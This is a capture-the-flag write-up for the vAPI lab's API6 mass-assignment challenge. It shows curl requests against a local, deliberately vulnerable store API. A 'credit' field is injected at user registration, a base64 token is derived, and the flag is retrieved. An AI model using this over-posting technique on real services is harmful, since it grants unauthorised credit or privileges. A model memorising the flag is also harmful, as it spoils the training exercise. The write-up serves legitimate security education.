> Welcome to our store , We will give you credits if you behave nicely. Our credit management is super secure

# Tools Used:
```
curl 8.8.0 (x86_64-pc-linux-gnu)
base64 (GNU coreutils) 9.4
echo (GNU coreutils) 9.4
```

# Create User
## POST /vapi/api6/user

Create a user
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' -H $'Content-Length: 68' \
    --data-binary $'{\x0d\x0a    \"name\":\"testname\",\x0d\x0a    \"username\":\"testusername\",\x0d\x0a    \"password\":\"testpassword\"\x0d\x0a}' \
    $'http://localhost/vapi/api6/user'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 29 Jun 2024 21:24:47 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 21:24:47 GMT
Content-Type: application/json

{"name":"testname","username":"testusername","id":2}
```

As specified in the Postman Collection, the test script to be executed for the API6 Create User endpoint is used to derive the key (Authorization-Token) by parsing the request JSON data, taking the values of the "username" and "password" key respectively with a colon between the two values, encoding the string in base64 and updates it in the Postman Environment as api6_auth.
```js
var reqData = JSON.parse(request.data);
var api6_username=reqData.username;
var api6_password=reqData.password;
var api6_auth=btoa(api6_username+":"+api6_password);
console.log("API 6 Auth : "+api6_auth);
postman.setEnvironmentVariable("api6_auth",api6_auth);
```

Manually derive the authorization token
```bash
echo -n "testusername:testpassword" | base64
```
```
dGVzdHVzZXJuYW1lOnRlc3RwYXNzd29yZA==
```
- We will need the Authorization Token for the "Get User" endpoint

# Get User
## GET /vapi/api6/user/me

Get data of the user we just created
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXJuYW1lOnRlc3RwYXNzd29yZA==' -H $'Host: localhost' \
    $'http://localhost/vapi/api6/user/me'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 29 Jun 2024 21:32:00 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 21:32:00 GMT
Content-Type: application/json

{"id":2,"name":"testname","username":"testusername","credit":"0"}
```
- Observe the value for credit is zero

# Create User
## POST /vapi/api6/user

Lets try to create a user with more credits than zero
```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Host: localhost' \
    --data-binary $'{\x0d\x0a    \"name\":\"testname1\",\x0d\x0a    \"username\":\"testusername1\",\x0d\x0a    \"password\":\"testpassword1\",\x0d\x0a\"credit\":\"369\"\x0d\x0a}' \
    $'http://localhost/vapi/api6/user'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 29 Jun 2024 21:34:55 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 21:34:55 GMT
Content-Type: application/json

{"name":"testname1","username":"testusername1","id":4}
```

Manually derive the authorization token
```bash
echo -n "testusername1:testpassword1" | base64
```
```
dGVzdHVzZXJuYW1lMTp0ZXN0cGFzc3dvcmQx
```

# Get User
## GET /vapi/api6/user/me

Get data of the new user we just created
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization-Token: dGVzdHVzZXJuYW1lMTp0ZXN0cGFzc3dvcmQx' -H $'Host: localhost' \
    $'http://localhost/vapi/api6/user/me'
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 29 Jun 2024 21:35:48 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Date: Sat, 29 Jun 2024 21:35:48 GMT
Content-Type: application/json

{"id":4,"name":"testname1","username":"testusername1","credit":"369","flag":"flag{api6_afb969db8b6e272694b4}"}
```
- Observe we are able to create a user with a non zero value for credit

API6 Flag
```
flag{api6_afb969db8b6e272694b4}
```

References:
https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/